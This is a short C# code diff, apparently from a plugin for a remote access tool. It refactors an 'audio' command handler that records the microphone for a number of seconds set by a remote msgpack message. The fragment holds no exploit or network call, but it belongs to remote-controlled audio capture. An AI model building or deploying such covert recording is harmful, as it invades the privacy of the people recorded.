@@ -27,15 +27,7 @@ namespace Plugin
             {
                 case "audio":
                     {
-                        var AR = new AudioRecorder();
-                        AR.StartAR();
-                        Thread.Sleep(100);
-                        DateTime dt1 = DateTime.Now;
-                        while ((DateTime.Now - dt1).TotalMilliseconds < Convert.ToInt32(unpack_msgpack.ForcePathObject("Second").AsString) * 1000)
-                        {
-                            continue;
-                        };
-                        AR.SaveAR();
+                        AudioRecorder.Audio(Convert.ToInt32(unpack_msgpack.ForcePathObject("Second").AsString));
                         break;
                     }
             }
